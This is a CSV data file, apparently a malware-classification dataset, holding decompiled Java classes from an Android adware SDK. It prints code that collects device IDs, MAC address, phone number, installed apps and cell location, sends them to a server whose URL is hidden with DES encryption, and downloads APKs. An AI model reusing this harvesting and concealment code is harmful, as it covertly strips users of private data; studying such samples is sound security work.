"filepath","code"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\config.code","public class config {   static config _config=null;   public static String s_strSdcardPath=""/mnt/sdcard/"";   static boolean sbIsInit=false;   final String Tag=""config"";   SeekBar mSeekBar=null;   TextView mText=null;   int mTimeForSecondShot=-1;   public static config Instance(){     if (_config == null) {       _config=new config();     }     return _config;   }   public static String getSdcardPath(){     if (!sbIsInit) {       Environment.getExternalStorageState().equals(""mounted"");       File path=Environment.getExternalStorageDirectory();       if (path != null && path.isDirectory() && path.canWrite()) {         s_strSdcardPath=String.valueOf(path.getAbsolutePath()) + ""/"";       }  else {         File file=new File(""/mnt/sdcard"");         if (file == null || file.listFiles() == null) {           s_strSdcardPath=""/sdcard/"";         }  else {           s_strSdcardPath=""/mnt/sdcard/"";         }       }       sbIsInit=true;       InitDir();     }     return s_strSdcardPath;   }   public static void MkDir(  String path){     try {       File file=new File(path);       if (file != null && file.exists() && !file.isDirectory()) {         file.delete();         file=new File(path);       }       if (file != null) {         if (!file.exists() || !file.isDirectory()) {           file.mkdir();         }       }     }  catch (    Exception e) {     }   }   public static void InitDir(){     MkDir(String.valueOf(getSdcardDir()) + ""img"");     MkDir(String.valueOf(getSdcardDir()) + ""videorecord"");     MkDir(String.valueOf(getSdcardDir()) + ""videorecord/img"");   }   public static String getSdcardDir(){     return getSdcardPath();   }   public static String getRecordPath(){     return String.valueOf(getSdcardDir()) + ""videorecord"";   }   public String GetLoadFileVersion(  Activity ctx,  String province,  String city,  String title){     return ""1.0"";   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\Configure.code","class Configure {   int mRscount=5;   int mFreeDay=1;   boolean mshowYoumi=true;   boolean mshowBaidu=true;   boolean mloadFromLocal=false;   boolean mshowQQ=false;   double mLastPkgversion=1.0d;   String mStrPkgurl="""";   double mVinvalid=0.9d;   Configure(){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\DismisThread.code","class DismisThread extends Thread {   ProgressDialog mProgressDialog;   DismisThread(  ProgressDialog progres){     this.mProgressDialog=null;     this.mProgressDialog=progres;   }   @Override public void run(){     super.run();     if (this.mProgressDialog != null) {       this.mProgressDialog.dismiss();       try {         Thread.sleep(2000L);       }  catch (      InterruptedException e) {         e.printStackTrace();       }       if (this.mProgressDialog != null) {         this.mProgressDialog.dismiss();       }       utility.Log("""",""ShowProgressDlg dismiss "" + this.mProgressDialog);       this.mProgressDialog=null;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\LoadCallBack.code","interface LoadCallBack {   int OnFinish(); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\myazcover.code","public class myazcover {   Handler mHandler=null;   long mlastshow=0;   static myazcover _instance=null;   public static boolean isshowdelay=false;   public static boolean isalaitop=true;   public static String strID=""15lB0wc2M8a3vuz5Q8o1o5F3"";   public static int sdelaytime=10;   public static myazcover instance(){     if (_instance == null) {       _instance=new myazcover();     }     return _instance;   }   public boolean isvalid(){     try {       return Class.forName(""com.feiwothree.coverscreen.CoverAdComponent"") != null;     }  catch (    ClassNotFoundException e) {       e.printStackTrace();       Log.v("""",""newpush InitPush2 error"");       return false;     }   }   public void init(  Context ctx,  String vid){     if (vid != null && vid.length() > 5) {       strID=vid;     }     if (isvalid()) {       this.mHandler=new Handler();       CPManager.init(ctx,strID);     }   }   public boolean showazad(  final Context ctx){     if (!isvalid()) {       return false;     }     long curtime=System.currentTimeMillis() / 1000;     if (Math.abs(curtime - this.mlastshow) < sdelaytime) {       return false;     }     this.mlastshow=curtime;     if (this.mHandler != null) {       this.mHandler.post(new Runnable(){         @Override public void run(){           CPManager.showAd(ctx);         }       } );     }     return true;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\progressbase.code","public class progressbase {   static int TIMEOUT=20000;   static int TMMESSAGE=1;   static progressbase _instance=null;   Context m_context=null;   List<ProgressDialog> mListProgress=new ArrayList();   Handler mHandler=new Handler(){     @Override public void handleMessage(    Message msg){       if (msg.what == 1) {         progressbase.this.mHandler.removeMessages(1);         if (progressbase.this.mListProgress.size() > 0) {           progressbase.this.cancelProgress(0);         }       }       super.handleMessage(msg);     }   } ;   long mNLastShow=0;   public static progressbase instance(){     if (_instance == null) {       _instance=new progressbase();     }     return _instance;   }   public void ShowProgressDlg(  Context ctx,  String title,  String message){     ShowProgressDlg(ctx,title,message,TMMESSAGE,TIMEOUT);   }   public synchronized void ShowProgressDlg(  Context ctx,  final String title,  final String message,  int DelayMsg,  int DelayTime){     if (ctx != null) {       if (this.mListProgress.size() <= 0) {         this.m_context=ctx;         if (this.mHandler != null) {           this.mHandler.post(new Runnable(){             @Override public void run(){               if (progressbase.this.mListProgress.size() <= 0) {                 progressbase.this.mNLastShow=System.currentTimeMillis();                 ProgressDialog progress=ProgressDialog.show(progressbase.this.m_context,title,message,true,true,new DialogInterface.OnCancelListener(){                   @Override public void onCancel(                  DialogInterface dialog){                     for (int i=0; i < progressbase.this.mListProgress.size(); i++) {                       if (progressbase.this.mListProgress.get(i) == dialog) {                         progressbase.this.mListProgress.remove(i);                         return;                       }                     }                   }                 } );                 progressbase.this.mListProgress.add(progress);                 utility.Log("""",""ShowProgressDlg "" + progress);               }             }           } );         }         this.mHandler.sendEmptyMessageDelayed(DelayMsg,DelayTime);       }     }   }   public synchronized void cancelProgress(  int ntime){     if (this.m_context != null) {       try {         Thread.sleep(100L);       }  catch (      InterruptedException e) {         e.printStackTrace();       }       this.mHandler.post(new Runnable(){         @Override public void run(){           while (progressbase.this.mListProgress.size() > 0) {             ProgressDialog dlg=progressbase.this.mListProgress.remove(0);             new DismisThread(dlg).start();           }         }       } );     }   } class DismisThread extends Thread {     ProgressDialog mProgressDialog;     DismisThread(    ProgressDialog progres){       this.mProgressDialog=null;       this.mProgressDialog=progres;     }     @Override public void run(){       super.run();       if (this.mProgressDialog != null) {         this.mProgressDialog.dismiss();         try {           Thread.sleep(2000L);         }  catch (        InterruptedException e) {           e.printStackTrace();         }         if (this.mProgressDialog != null) {           this.mProgressDialog.dismiss();         }         utility.Log("""",""ShowProgressDlg dismiss "" + this.mProgressDialog);         this.mProgressDialog=null;       }     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\RtspInfo.code","class RtspInfo {   String mStrUrl;   String mVersion;   RtspInfo(){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.adfeiwo\utility.code","public class utility {   public static int DEBUG_MODE;   static utility _instanceUtility=null;   static boolean m_bIsLoadXmlDlgOn=false;   public static double VERSION=1.08d;   Activity mActivity=null;   LoadCallBack mLoadXmlCallBack=null;   LoadCallBack mLoadHttpCallBack=null;   boolean m_bIsLoadHttpDlgOn=false;   Configure mConfigure=new Configure();   List<RtspInfo> mRtspList=new ArrayList();   LoadCallBack mLoadCityCallBack=null;   boolean m_bIsLoadCityDlgOn=false; interface LoadCallBack {     int OnFinish();   }   private utility(){   } static {     DEBUG_MODE=4;     File file=new File(""/sdcard/spjt/debug"");     if (file != null && file.exists()) {       DEBUG_MODE=0;       return;     }     File file2=new File(""/mnt/sdcard/spjt/debug"");     if (file2 != null && file2.exists()) {       DEBUG_MODE=0;       return;     }     File file3=new File(""/data/data/spjt/debug"");     if (file3 == null || !file3.exists()) {       return;     }     DEBUG_MODE=0;   }   public static utility Instance(){     if (_instanceUtility == null) {       _instanceUtility=new utility();     }     return _instanceUtility;   }   void setActivity(  Activity ctx){     this.mActivity=ctx;   }   public void SaveDoublePreference(  Context ctx,  String key,  Float value){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx != null) {       SharedPreferences.Editor editor=PreferenceManager.getDefaultSharedPreferences(ctx).edit();       editor.putFloat(key,value.floatValue());       editor.commit();     }   }   public Float getDoublePreferencesValue(  Context ctx,  String key,  Float defValue){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx != null) {       SharedPreferences p=PreferenceManager.getDefaultSharedPreferences(ctx);       return Float.valueOf(p.getFloat(key,defValue.floatValue()));     }     return defValue;   }   public void SaveStringPreference(  Context ctx,  String key,  String value){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx != null) {       SharedPreferences.Editor editor=PreferenceManager.getDefaultSharedPreferences(ctx).edit();       editor.putString(key,value);       editor.commit();     }   }   public String getPreferencesValue(  Context ctx,  String key,  String defValue){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx != null) {       SharedPreferences p=PreferenceManager.getDefaultSharedPreferences(ctx);       return p.getString(key,defValue);     }     return defValue;   }   public void SaveIntPreference(  Context ctx,  String key,  int value){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx != null) {       SharedPreferences.Editor editor=PreferenceManager.getDefaultSharedPreferences(ctx).edit();       editor.putInt(key,value);       editor.commit();     }   }   public boolean getBoolPreferencesValue(  Context ctx,  String key,  Boolean defValue){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx == null) {       return defValue.booleanValue();     }     SharedPreferences p=PreferenceManager.getDefaultSharedPreferences(ctx);     return p.getBoolean(key,defValue.booleanValue());   }   public void SaveBoolPreference(  Context ctx,  String key,  Boolean value){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx != null) {       SharedPreferences.Editor editor=PreferenceManager.getDefaultSharedPreferences(ctx).edit();       editor.putBoolean(key,value.booleanValue());       editor.commit();     }   }   public int getIntPreferencesValue(  Context ctx,  String key,  int defValue){     if (ctx == null) {       ctx=this.mActivity;     }     if (ctx != null) {       SharedPreferences p=PreferenceManager.getDefaultSharedPreferences(ctx);       return p.getInt(key,defValue);     }     return defValue;   }   void ReflashProgress(  final ProgressBar bar,  final int nProgress){     bar.post(new Runnable(){       @Override public void run(){         bar.setProgress(nProgress);       }     } );   } class RtspInfo {     String mStrUrl;     String mVersion;     RtspInfo(){     }   } class Configure {     int mRscount=5;     int mFreeDay=1;     boolean mshowYoumi=true;     boolean mshowBaidu=true;     boolean mloadFromLocal=false;     boolean mshowQQ=false;     double mLastPkgversion=1.0d;     String mStrPkgurl="""";     double mVinvalid=0.9d;     Configure(){     }   }   void SaveConfig(  Activity ctx){     SaveIntPreference(ctx,""config:mRscount"",this.mConfigure.mRscount);     SaveIntPreference(ctx,""config:mFreeDay"",this.mConfigure.mFreeDay);     SaveStringPreference(ctx,""config:mStrPkgurl"",this.mConfigure.mStrPkgurl);     SaveBoolPreference(ctx,""config:mshowYoumi"",Boolean.valueOf(this.mConfigure.mshowYoumi));   }   String getElementValue(  Element in){     if (in == null || in.getFirstChild() == null) {       return """";     }     String res=in.getFirstChild().getNodeValue();     return res;   }   boolean IsNeedForceUpdate(){     return VERSION < this.mConfigure.mVinvalid;   }   public static void Log(  String str1,  String str2){     if (DEBUG_MODE <= 3) {       Log.v(str1,str2);     }   }   public static String getFormatTime(  int timeMs){     StringBuilder mFormatBuilder=new StringBuilder();     Formatter mFormatter=new Formatter(mFormatBuilder,Locale.getDefault());     int seconds=timeMs % 60;     int minutes=(timeMs / 60) % 60;     int hours=timeMs / 3600;     mFormatBuilder.setLength(0);     return hours > 0 ? mFormatter.format(""%d:%02d:%02d"",Integer.valueOf(hours),Integer.valueOf(minutes),Integer.valueOf(seconds)).toString() : mFormatter.format(""%02d:%02d"",Integer.valueOf(minutes),Integer.valueOf(seconds)).toString();   }   public static String getString(  Activity ctx,  int id){     if (ctx == null) {       return """";     }     try {       return ctx.getResources().getString(id);     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\A.code","final class A extends Thread {   private SR a;   private final Intent b;   private final Context c;   public A(  SR sr,  Intent intent,  Context context){     this.a=sr;     this.b=intent;     this.c=context;   }   @Override public final void run(){     try {       SR.a(this.a,this.c,this.b.getDataString().substring(8));     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\AppWallManager.code","public class AppWallManager {   private static AppWallManager a;   private Context b;   private Handler c=new Handler();   private String d;   private AppWallManager(  Context context,  String str){     this.b=context;     this.d=str;     context.getSharedPreferences(""DP_AW_FILE"",0).edit().putString(""ak"",this.d).commit();   }   public static void init(  Context context,  String str){     if (context == null) {       throw new IllegalArgumentException(""context is null"");     }     if (D.a(str)) {       throw new IllegalArgumentException(""appkey is null"");     }     if (str.length() <= 8) {       throw new IllegalArgumentException(""appkey is invalid"");     }     a=new AppWallManager(context,str);     C0007g.a(context);     v.a();     if (context.getSharedPreferences(""DP_AW_FILE"",0).getBoolean(""ISFIRSTRUN"",true)) {       JSONObject a2=C0001a.a(a.b,a.d,""ak"");       q qVar=new q();       qVar.a(a.b,C0002b.a(),a.d,a2.toString());       qVar.a(new C0003c());       o.a().a(qVar);     }   }   public static void showAppWall(  Context context){     if (a == null) {       Log.d(""APPWALL"",""AppWallManager is not yet initialize"");       return;     }     AppWallManager appWallManager=a;     if (C0006f.b(context)) {       appWallManager.c.post(new RunnableC0004d(appWallManager));     }  else {       Log.d(""APPWALL"",""network is not available !"");     }   }   public final Context a(){     return this.b;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\B.code","public final class B {   int a=0;   int b=0; } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C.code","public final class C {   public static String a(  Context context,  String str,  String str2){     return a(context,str,str2,""0"");   }   public static String a(  Context context,  String str,  String str2,  String str3){     return context.getSharedPreferences(str,0).getString(str2,str3);   }   public static void b(  Context context,  String str,  String str2){     context.getSharedPreferences(str,0).edit().remove(str2).commit();   }   public static void b(  Context context,  String str,  String str2,  String str3){     context.getSharedPreferences(str,0).edit().putString(str2,str3).commit();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0001a.code","public class C0001a {   private int a;   private String b;   private String c;   private String d;   private String e;   public C0001a(){   }   public C0001a(  int i,  String str,  String str2,  String str3,  String str4){     this.a=i;     this.b=str;     this.c=str2;     this.d=str3;     this.e=str4;   }   public static JSONObject a(  Context context,  String str,  String str2){     JSONObject jSONObject=new JSONObject();     String a=u.a(context);     String b=u.b();     t.a();     String a2=t.a(context,false);     String str3=String.valueOf(u.d(context).a) + ""*"" + u.d(context).b;     String a3=u.a();     String d=u.d();     String c=u.c();     String b2=C0006f.a(context).b();     String a4=C0006f.a(context).a();     String c2=C0006f.a(context).c();     B d2=u.d(context);     String str4=String.valueOf(d2.a) + ""*"" + d2.b;     String b3=u.b(context);     String c3=u.c(context);     try {       jSONObject.put(""devid"",a);       jSONObject.put(""model"",b);       jSONObject.put(""packagenames"",a2);       jSONObject.put(""resolution"",str3);       jSONObject.put(""brand"",a3);       jSONObject.put(""versionrelease"",d);       jSONObject.put(""versioncode"",c);       jSONObject.put(""appkey"",str);       jSONObject.put(""adsdkversion"",str2);       jSONObject.put(""sdktype"",""APPWALL"");       jSONObject.put(""wifi"",c3);       jSONObject.put(""call_id"",b2);       jSONObject.put(""mac"",b3);       jSONObject.put(""screen_size"",str4);       jSONObject.put(""mobile_num"",c2);       jSONObject.put(""mnc"",a4);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  String str2,  String str3){     String a=u.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion"",str);       jSONObject.put(""devid"",a);       jSONObject.put(""packname"",str2);       jSONObject.put(""id"",str3);       jSONObject.put(""sdktype"",""APPWALL"");     }  catch (    JSONException e) {     }     return jSONObject;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public int e(){     return this.a;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0002b.code","public final class C0002b {   private static final String a=C0008h.a(""H8Zno4EBTQx9HFCC0rcAQqd931fYhjBLaFEZBiEdBCo="",C0008h.a(""123456""));   public static String a(){     return String.valueOf(a) + ""/clientinfo"";   }   public static String b(){     return String.valueOf(a) + ""/appWallInstallCount"";   }   public static String c(){     return String.valueOf(a) + ""/appwalllist"";   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0003c.code","public final class C0003c implements p {   @Override public final void a(  boolean z,  String str){     AppWallManager appWallManager;     appWallManager=AppWallManager.a;     appWallManager.a().getSharedPreferences(""DP_AW_FILE"",0).edit().putBoolean(""ISFIRSTRUN"",false).commit();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0005e.code","public final class C0005e {   private static final char[] a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b;   private static final byte[] c; static {     int[] iArr=new int[IController.START_VALUE];     b=iArr;     Arrays.fill(iArr,-1);     int length=a.length;     for (int i=0; i < length; i++) {       b[a[i]]=i;     }     b[61]=0;     c=new byte[128];     for (int i2=0; i2 < 128; i2++) {       c[i2]=-1;     }     for (int i3=65; i3 <= 90; i3++) {       c[i3]=(byte)(i3 - 65);     }     for (int i4=97; i4 <= 122; i4++) {       c[i4]=(byte)((i4 - 97) + 26);     }     for (int i5=48; i5 <= 57; i5++) {       c[i5]=(byte)((i5 - 48) + 52);     }     c[43]=62;     c[47]=63;   }   public static final String a(  byte[] bArr,  boolean z){     return new String(b(bArr,z));   }   public static final byte[] a(  java.lang.String r10){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.appwall.C0005e.a(java.lang.String):byte[]"");   }   private static char[] b(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=a[i16 >> 12];       cArr[i3 - 3]=a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0006f.code","public class C0006f {   private static C0006f a;   private String b;   private String c;   private String d;   public C0006f(){   }   private C0006f(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       this.b=telephonyManager.getNetworkOperator().substring(3);       if (telephonyManager.getCellLocation() instanceof CdmaCellLocation) {         CdmaCellLocation cdmaCellLocation=(CdmaCellLocation)telephonyManager.getCellLocation();         this.c=String.valueOf(cdmaCellLocation.getBaseStationId());         cdmaCellLocation.getNetworkId();         this.d=telephonyManager.getLine1Number();       }  else       if (telephonyManager.getCellLocation() instanceof GsmCellLocation) {         GsmCellLocation gsmCellLocation=(GsmCellLocation)telephonyManager.getCellLocation();         this.c=String.valueOf(gsmCellLocation.getCid());         gsmCellLocation.getLac();         this.d=telephonyManager.getLine1Number();       }     }  catch (    Exception e) {       e.getStackTrace();     }   }   public static C0006f a(  Context context){     if (a == null) {       a=new C0006f(context);     }     return a;   }   public static boolean b(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return activeNetworkInfo != null && activeNetworkInfo.isConnected();   }   public final String a(){     return this.b;   }   public final String b(){     return this.c;   }   public final String c(){     return D.a(this.d) ? """" : this.d;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0007g.code","public class C0007g {   static C0007g a;   ConcurrentLinkedQueue b;   Map c;   Context d;   Handler e;   public C0007g(){   }   private C0007g(  Context context){     this.b=new ConcurrentLinkedQueue();     this.c=new ConcurrentHashMap();     this.d=context;     this.e=new Handler();   }   public static C0007g a(){     if (a == null) {       throw new RuntimeException(""DownloadManager is not yet initialize"");     }     return a;   }   public static void a(  Context context){     a=new C0007g(context);   }   public void a(  C0001a c0001a){     new StringBuilder(""[DownloadManager] removeTask: "").append(c0001a.a()).append("","").append(c0001a.d());     this.c.remove(c0001a.d());   }   public void a(  C0001a c0001a,  C0009i c0009i){     new StringBuilder(""[DownloadManager] addTask: "").append(c0001a.a()).append("","").append(c0001a.d());     C0010j c0010j=(C0010j)this.c.get(c0001a.d());     if (c0010j != null) {       c0010j.a(c0009i);       return;     }     C0010j c0010j2=new C0010j(this,c0001a,c0009i);     this.c.put(c0001a.d(),c0010j2);     c0010j2.start();   }   public boolean a(  String str){     return this.c.containsKey(str);   }   public void b(){     C0010j c0010j=(C0010j)this.b.poll();     while (c0010j != null) {       a(c0010j.b,(C0009i)c0010j.a.poll());       c0010j=(C0010j)this.b.poll();     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0008h.code","public final class C0008h { static {     char[] cArr={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};   }   public static String a(  String str){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(str.substring(0,4));     stringBuffer.append(str.substring(str.length() - 4));     return stringBuffer.toString();   }   public static String a(  String str,  String str2){     if (str == null) {       return null;     }     return new String(c(str,str2));   }   public static String a(  String str,  String str2,  boolean z){     if (str == null) {       return null;     }     return C0005e.a(b(str,str2),false);   }   private static byte[] b(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES"");       Cipher cipher=Cipher.getInstance(""DES"");       byte[] bytes=str.getBytes(""utf-8"");       cipher.init(1,secretKeySpec);       return cipher.doFinal(bytes);     }  catch (    UnsupportedEncodingException e) {       return null;     } catch (    InvalidKeyException e2) {       return null;     } catch (    NoSuchAlgorithmException e3) {       return null;     } catch (    BadPaddingException e4) {       return null;     } catch (    IllegalBlockSizeException e5) {       return null;     } catch (    NoSuchPaddingException e6) {       return null;     }   }   private static byte[] c(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES"");       Cipher cipher=Cipher.getInstance(""DES"");       byte[] a=C0005e.a(str);       cipher.init(2,secretKeySpec);       return cipher.doFinal(a);     }  catch (    InvalidKeyException e) {       return null;     } catch (    NoSuchAlgorithmException e2) {       return null;     } catch (    BadPaddingException e3) {       return null;     } catch (    IllegalBlockSizeException e4) {       return null;     } catch (    NoSuchPaddingException e5) {       return null;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0009i.code","public class C0009i implements p {   private final Context a;   private final String b;   public C0009i(){   }   public C0009i(  SR sr,  Context context,  String str){     this.a=context;     this.b=str;   }   @Override public void a(  boolean z,  String str){     new StringBuilder(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstall from ScreenReceiverï¼‰ï¼š"").append(str);     if (z) {       return;     }     String a=C.a(this.a,""DP_AW_FILE"",""packnames"",null);     if (a != null) {       new StringBuilder(String.valueOf(a)).append("","").append(this.b);     }  else {       String str2=this.b;     }     C.b(this.a,""DP_AW_FILE"",""packnames"",this.b);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\C0010j.code","public final class C0010j extends Thread {   C0001a b;   String c;   long d;   private C0007g h;   private long e=0;   private long f=0;   private int g=0;   Queue a=new ConcurrentLinkedQueue();   public C0010j(  C0007g c0007g,  C0001a c0001a,  C0009i c0009i){     this.h=c0007g;     this.b=c0001a;     this.c=n.a(c0007g.d,""/adfeiwo/appwall/apk"",c0001a.d());     a(c0009i);   }   private void a(  int i){     new StringBuilder(""[DownloadCallback] doProgress, progress: "").append(i);     this.h.e.post(new m(this,i));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       it.next();       C0001a c0001a=this.b;       String str=this.c;     }   }   private void a(  boolean z){     new StringBuilder(""[DownloadCallback] doComplete, success: "").append(z).append("", url: "").append(this.b.d());     this.h.e.post(new l(this,z));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       it.next();       C0001a c0001a=this.b;       String str=this.c;     }   }   public final void a(  C0009i c0009i){     if (c0009i != null) {       this.a.add(c0009i);     }   }   @Override public final void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.appwall.C0010j.run():void"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\D.code","public final class D {   public static String a(  int i){     String[] strArr={""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""0""};     Random random=new Random();     StringBuilder sb=new StringBuilder();     while (i > 0) {       sb.append(strArr[random.nextInt(10)]);       i--;     }     return sb.toString();   }   public static boolean a(  String str){     return str == null || str.trim().length() == 0 || str.equals(""null"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\E.code","final class E implements DownloadListener {   public E(  WA wa){   }   @Override public final void onDownloadStart(  String str,  String str2,  String str3,  String str4,  long j){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\F.code","final class F extends WebChromeClient {   private WA a;   public F(  WA wa){     this.a=wa;   }   @Override public final void onProgressChanged(  WebView webView,  int i){     this.a.setProgress(i * 100);     WA.a(this.a,""å·²åŠ è½½ >> "" + i + ""%"");     if (i >= 100) {       WA.a(this.a,null);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\G.code","final class G extends WebViewClient {   private WA a;   public G(  WA wa){     this.a=wa;   }   @Override public final void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     super.onPageStarted(webView,str,bitmap);   }   @Override public final void onReceivedError(  WebView webView,  int i,  String str,  String str2){     if (str2 == null || !str2.startsWith(""http://"")) {       return;     }     this.a.a.loadData(""<h1>Page load Error !</h1>"",""text/html"",""UTF-8"");     WA.a(this.a,null);     this.a.b=true;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\H.code","final class H implements Runnable {   private WA a;   public H(  WA wa){     this.a=wa;   }   @Override public final void run(){     this.a.finish();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\I.code","final class I implements Runnable {   private WA a;   private final String b;   public I(  WA wa,  String str){     this.a=wa;     this.b=str;   }   @Override public final void run(){     s.a();     s.b(this.a.getApplicationContext(),this.b);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\J.code","final class J implements Runnable {   private WA a;   private final String b;   private final int c;   private final String d;   public J(  WA wa,  String str,  int i,  String str2){     this.a=wa;     this.b=str;     this.c=i;     this.d=str2;   }   @Override public final void run(){     C.b(this.a.getApplicationContext(),""DP_AW_FILE"",this.b.replace(""."",""""),String.valueOf(this.c) + "","" + new Date().getTime());     String a=n.a(this.a.getApplicationContext(),""/adfeiwo/appwall/apk"",this.d);     s.a();     s.a(this.a.getApplicationContext(),a);   } } "
